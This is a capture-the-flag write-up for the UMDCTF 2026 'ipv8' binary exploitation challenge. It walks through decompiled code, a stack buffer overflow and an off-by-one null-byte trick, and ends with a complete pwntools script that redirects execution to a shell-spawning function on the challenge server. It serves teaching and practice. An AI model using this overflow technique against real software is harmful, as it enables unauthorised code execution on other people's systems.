---
title: "UMDCTF 206: ipv8 Pwn Challenge Writeup"
date: 2026-04-29
categories: 
  - "reverse-engineering"
  - "pwn"
tags: 
  - "pwn"
  - "ctf"
  - "umdctf"
  - "umdctf2026"
  - "binary exploitation"
  - "reverse-engineering"
---

This week I am looking at an online CTF pwn challenge from UMDCTF 2026 - ipv8. It is the first challenge in pwn category with most amount of solves, so this should be an easy challenge. Although it was an easy challenge, it does come with its own twists and traps.  

My other pwn writeups in this challenge series can be found here: <https://yusuftas.net/categories/pwn/>

## First Look

Looking at file size and functions in Ghidra, it is safe to say that it is statically linked, so we don't need to worry about external libc. And checksec results:

```
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

It indicates NO PIE, which is great. Canary seems enabled, but looking at the main function in Ghidra I don't see a stack canary check, it may not be an issue after all. Let's look at the decompiled main function and see if we can identify any bugs:

```c++

undefined8 main(void)

{
  int iVar1;
  undefined1 userIn2 [48];
  undefined8 local_98 [6];
  undefined1 userIn1 [48];
  undefined8 local_38;
  
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stderr,(char *)0x0,2,0);
  puts("IPv8 is the future! As someone with an ipv4 address, luckily ipv8 is backwards compatible!")
  ;
  puts("What is your Source ASN Prefix?");
  printf("> ");
  __isoc23_scanf(&DAT_0049d5cb);
  puts("Sorry, you don\'t get to set that silly! This is for ipv8 only!");
  local_38 = 0x302e302e302e30;
  local_98[0] = 0x302e302e302e30;
  puts("What is your Source Host Address?");
  printf("> ");
  __isoc23_scanf(&DAT_0049d632,userIn1);
  iVar1 = check_valid_address(userIn1);
  if (iVar1 != 0) {
    puts("Thats not a valid address!\nHere\'s an ipv8 packet for your reference :3");
    printf(header_format);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  puts("What is your Destination ASN Prefix?");
  printf("> ");
  __isoc23_scanf(&DAT_0049d5cb);
  puts("Sorry, you don\'t get to set that silly! This is for ipv8 only!");
  puts("What is your Destination Host Address?");
  printf("> ");
  __isoc23_scanf(&DAT_0049d6cf,userIn2);
  iVar1 = check_valid_address(userIn2);
  if (iVar1 != 0) {
    puts("You\'re soo silly, u got your source address right, now tell me where u want to go :3");
    printf(header_format);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  check_rine(local_98);
  return 0;
}

bool check_valid_address(char *param_1)
{
  char *local_20;
  int local_c;
  
  local_c = 0;
  for (local_20 = param_1; *local_20 != '\0'; local_20 = local_20 + 1) {
    if (*local_20 == '.') {
      local_c = local_c + 1;
    }
  }
  return local_c != 3;
}

void check_rine(char *param_1)
{
  int iVar1;
  
  iVar1 = strcmp(param_1,"0.0.0.0");
  if (iVar1 == 0) {
    puts("Sorry, we want devices using ipv8 only...");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = strcmp(param_1,"100.72.7.67");
  if (iVar1 == 0) {
    puts("Welcome in our beloved ipv8 address");
    win();
  }
  else {
    puts("Wrong RINE address!! Perhaps you were looking for 100.72.7.67");
  }
  return;
}

void win(void)
{
  system("/bin/sh");
  return;
}

```

A few bugs and observations we can make based on the functions

1. User can provide input through 4 scanf calls. 
2. 2 of these scanf calls (first and third) doesn't seem to be doing anything:  scanf("%*s") -> input is just discarded. We can probably just give anything to these calls.
3. Second scanf call uses %s without any limits -> Buffer overflow #1
4. Fourth scanf call uses %48s and the buffer that is read into is 48 bytes long! This will become very important later on since scanf will put a \00 null byte at the end of string.
5. 2nd and 4th scanf calls require inputs to pass check_valid_address check which basically requires inputs to contain exactly three dots ... Position doesn't matter they can be anywhere in the input.
6. win function is our target to return to for the shell. check_rine function requires a certain parameter in the stack to be 100.72.7.67 to call win function. 
7. check_rine function also requires that parameter to be not 0.0.0.0, otherwise it calls exit() -> this is also important for later on 
8. No visible format string vulnerability.

I think this is enough information gathered to work on the exploit.

## Failed Approach

We have a stack buffer overflow, and there is a variable in stack that is checked by check_rine to call win() function. What does this tell me? Buffer overflow and overwrite the variable to become 100.72.7.67. It is a great idea, but there is a problem: it doesn't work. It was worth a try anyway. Let's look at the stack layout and how the buffer overflow works:

![Stack Layout](/assets/img/ipv8_stack.png)

I marked how the inputs go through the stack. For example if an input overflows userIn1, it will start overwriting anotherLocal, and return address etc. Similarly if we overflow userIn2, it will first overwrite inputToRine, then userIn1, then anotherLocal then return address. With that logic, **by overflowing userIn1, we can never reach inputToRine due to its position in the stack.** But if we can overflow userIn2, we can overwrite inputToRine to the expected value. Here is the catch: **userIn2 is used in fourth scanf call which only reads 48 bytes!** So we can't overflow into the inputToRine unfortunately, there is no easy way to overwrite it on the stack. 

## Solution

Okay now that the failed approach is out, we can focus on the actual solution. Since we can't overwrite inputToRine on the stack, we have to do BOF to change return address and return to win() function - classical buffer overflow. Summary of the approach:

1. Calculate the offset to return address from userIn1
2. Buffer overflow userIn1 and overwrite return address.
3. check_rine requires inputToRine to be not 0.0.0.0 -> Use the bug we found in fourth scanf call: provide 48 bytes, null byte as 49th byte should change inputToRine's first byte to null.
4. Make sure second and fourth inputs follow three dot rule.

### Offset Calculation

I mentioned this before, normal people uses cyclic buffers and what not to find offsets, I don't. I look at the stack layout while debugging:

![Offset search](/assets/img/ipv8_offset.png)

Looking at the stack we can see our input at 0x7fffa50e4bd0 (rsp + 0x60) and return address at 0x7fffa50e4c38 (rsp + 0xc8). So the offset to the return address is simply the difference between them:

`0x7fffa50e4c38 - 0x7fffa50e4bd0 = (rsp + 0xc8) - (rsp + 0x60) = 0x68 = 104`

So we need to provide 104 bytes of input and then next following bytes will overwrite the return address. Return address we want to go is win() function. For some reason returning back to the exact beginning of win() function didn't start the shell for me so I ended up using the next instruction. And finally we also need to provide 3 dots to meet validation check, so payload to 2nd scanf call becomes:

```python
payload = b'...' + b'A' * 101 + p64(elf.symbols['win'] + 1)     # win+1 address from code
```

This will override the return address of the main function, so instead of main returning back to libc_start_call_main, it will return back to win+1 instruction. Now we only need to make sure main actually returns. 

### Passing check_rine

Going back to the first analysis points, check_rine calls exit(1) if the input to it is equal to 0.0.0.0. If that happens, we can't go back to main and hence we can't go back to the win function with our return address override. So we need to make sure input to the check_rine isn't equal to 0.0.0.0. Looking back to the code, input to check_rine comes from local variable in the stack which is actually right after the userIn2.

Remember when I mentioned the bug in 4th scanf call? That scanf call reads %48s into 48 byte sized buffer. **What this does is it can read up to 48 bytes, and then to finish the string it will append a null byte at the end. But what if we provide exactly 48 bytes? Once the null byte is appended, 48 bytes buffer will get filled and extra null byte will overflow to the next variable in stack: inputToRine**. This is simply the solution, provide 48 bytes and scanf will overflow to the 0.0.0.0's first byte with a null byte, once it overflows there, it will no longer match the check in check_rine function.

`p.sendline(b'...' + b'B'*45)`


## Final Code

I think I discussed important points from the challenge, here is the full solver code:

```python
from pwn import *

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Ubuntu']
# context.log_level = 'debug'

exe  = './ipv4'
context.binary = exe
elf = ELF(exe)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        p = remote('challs.umdctf.io', 30308)
        return p
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b *main+282
b *main+466
b *main+481
b *check_rine+29
b *main+556
'''.format(**locals())


p = start()

# First scanf - send anything
p.recvuntil(b'>')
p.sendline(b'skip')

# Second scanf - BOF return address to win function
payload = b'...' + b'A' * 101 + p64(elf.symbols['win'] + 1)     # win+1 address from code
p.recvuntil(b'>')
p.sendline(payload)

# Third scanf - send anything
p.recvuntil(b'>')
p.sendline(b'skip')

# Fourth scanf - 48 sent - null byte appended will clear first byte of 0.0.0.0
p.recvuntil(b'>')
p.sendline(b'...' + b'B'*45)

# We should get the shell
p.interactive()
```

Overall it was an easy challenge, but it was fun regardless. Due to time limits in CTFs I tend to target easy challenges, fearing I won't have enough time to solve more difficult ones. I managed to solve this quicker than I expected, so maybe next time I will increase the difficulty of my target. Time to wrap this up, as always keep learning!